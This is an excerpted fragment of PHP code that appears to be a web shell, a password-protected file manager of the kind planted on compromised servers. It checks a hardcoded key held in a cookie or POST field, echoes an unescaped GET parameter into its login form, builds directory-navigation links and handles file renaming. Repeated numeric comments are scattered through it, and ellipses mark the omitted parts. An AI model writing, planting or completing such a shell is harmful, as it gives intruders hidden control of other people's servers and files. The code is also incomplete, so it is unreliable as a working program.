...
$auth_key = "ed4e01da243ff683c823f6d00a58a7b4";
...
$pass = false;
if (isset($_COOKIE['pw_name_61380'])) {
    if(($_COOKIE['pw_name_61380']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_61380'])) {
        if(($_POST['pw_name_61380']) == $auth_key) {
            setcookie("pw_name_61380", $_POST['pw_name_61380']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_61380' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725170552259575 1725170552216724 1725170552916799 1725170552694710
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725170552259575 1725170552216724 1725170552916799 1725170552694710
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725170552259575 1725170552216724 1725170552916799 1725170552694710
            $name = PATH . "/" . $_GET['r'];
